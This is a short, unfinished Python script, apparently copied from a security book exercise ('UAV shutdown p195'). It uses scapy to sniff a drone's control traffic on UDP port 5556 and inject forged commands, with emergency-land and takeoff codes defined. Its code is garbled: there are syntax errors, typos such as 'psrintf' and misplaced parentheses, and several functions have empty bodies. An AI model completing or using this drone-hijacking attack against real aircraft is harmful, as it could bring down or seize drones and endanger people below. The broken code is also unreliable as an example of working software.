import threading, dup
from scapy.all import *

conf.iface='mon0'
NAVPORT = 5556
LAND = '290717696'
EMER = '290717952'
TAKEOFF = '290718208'

def banner():
	print "[***]	UAV shutdown p195	[***]"


class interceptThread(threading, Thread):
	def __init__(self):
		threading.Thread.__init__(self)
		self.curPkt = None
		self.seq=0
		self.foundUAV = False

	def run(self):
		sniff(prn=self.interceptPkt, filter='udp port 5556')

	def interceptPkt(self, pkt):
		if self.foundUAV == False:
			print '[*] UAV Found.'
			self.foundUAV = True
		self.curPkt = pkt
		raw = pkt.psrintf('%Raw.load%')
		try:
			self.seq = int(raw.split(','[0].split('='[-1])+5))
		except:
			self.seq = 0

	def injectCmd(self, cmd):
		radio = dup.dupRadio(self, curPkt)
		dot11 = dup.dupDot11(self, curPkt)
		snap = dup.dupSNAP(self)

	def emergencyland(self):

	def takeoff(self):

def main():

if __name__ == '__main__':
	main()